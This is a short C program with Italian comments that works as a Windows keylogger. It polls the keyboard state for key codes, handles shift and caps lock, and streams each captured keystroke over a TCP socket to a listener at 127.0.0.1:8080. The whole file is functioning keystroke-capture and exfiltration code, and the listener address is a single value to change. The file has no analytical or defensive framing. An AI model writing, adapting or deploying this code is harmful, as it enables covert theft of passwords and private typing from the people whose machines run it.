#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <conio.h>
#include <time.h>
#include <unistd.h>

// Questa riga dice al compilatore di collegare la libreria dei socket di Windows
#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in serv_addr;
    clock_t start, end;

    // 1. Inizializzazione Winsock (Obbligatorio su Windows)
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Errore inizializzazione WSA\n");
        return 1;
    }

    // 2. Creazione Socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(8080);
    inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);

    // 3. Connessione
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
        printf("Connessione fallita. Il server e' acceso?\n");
        WSACleanup();
        return 1;
    }

    int done = 1;
    int i = 0;
    while(done) {
        for(i = 8; i <= 127; i++) {
            if (GetAsyncKeyState(i)) {
                if (i == VK_SHIFT || i == VK_LSHIFT || i == VK_RSHIFT || 
                    i == VK_CONTROL || i == VK_MENU) {
                    continue;
                }

                end = clock();
                char key = i;

                if (key == 13) key = '\n';
                if (key == 27) key = '\n';
                if(key == 9) key = 0;

                if (key >= 'A' && key <= 'Z') {
                    int shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
                    int caps = GetKeyState(VK_CAPITAL) & 0x0001;

                    if (!(shift ^ caps)) { 
                        key += 32; // Converti in minuscolo
                    }
                }

                double timems = ((double)(end - start) / CLOCKS_PER_SEC) * 1000;
                if (timems > (10 * 1000)) {
                    char newline = '\n';
                    send(sock, &newline, sizeof(char), 0);
                }

                printf("Tasto premuto: %c\n", key);
                send(sock, &key, sizeof(char), 0);

                start = clock();
            }
        }
        usleep(100 * 1000); 
    }

    // 4. Pulizia
    closesocket(sock);
    WSACleanup();

    return 0;
}